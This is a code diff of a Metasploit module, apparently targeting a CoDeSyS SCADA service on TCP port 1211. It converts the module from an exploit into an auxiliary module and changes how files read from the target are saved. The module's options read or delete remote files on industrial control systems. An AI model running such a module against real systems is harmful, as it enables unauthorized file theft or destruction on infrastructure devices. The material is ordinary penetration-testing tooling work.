@@ -6,9 +6,9 @@
 ##
 
 require 'msf/core'
-class Metasploit3 < Msf::Exploit::Remote
+class Metasploit3 < Msf::Auxiliary
 
-	Rank = ExcellentRanking
+	include Msf::Auxiliary::Report
 	include Msf::Exploit::Remote::Tcp
 
 	def initialize(info = {})
@@ -45,7 +45,6 @@ class Metasploit3 < Msf::Exploit::Remote
 				Opt::RPORT(1211),
 				OptString.new('FILEPATH', [false, 'Path to file']),
 				OptString.new('FILENAME', [true, 'Filename']),
-				OptString.new('LOCALPATH', [false, 'Local filepath to store the file in READ mode']),
 				OptString.new('ACTION', [true, 'READ or DELETE', 'READ'])
 			], self.class
 		)
@@ -85,11 +84,9 @@ class Metasploit3 < Msf::Exploit::Remote
 		end
 
 		if remote_file != nil
-			f = File.new("#{localpath}/#{filename}",  "w")
 			# trim 14 chars since that is part of the SCADA response, this allows to retrieve valid binaries
-			f.write(remote_file[14..-1])
-			f.close
-			#print_debug("remote file: #{remote_file[14..-1]}")
+			f = store_loot(filename, "text/plain", session, remote_file[14..-1], filename, "S3 CoDeSyS file extracted")
+			print_good("Saved remote file: #{f.to_s}")
 		end
 	end
 
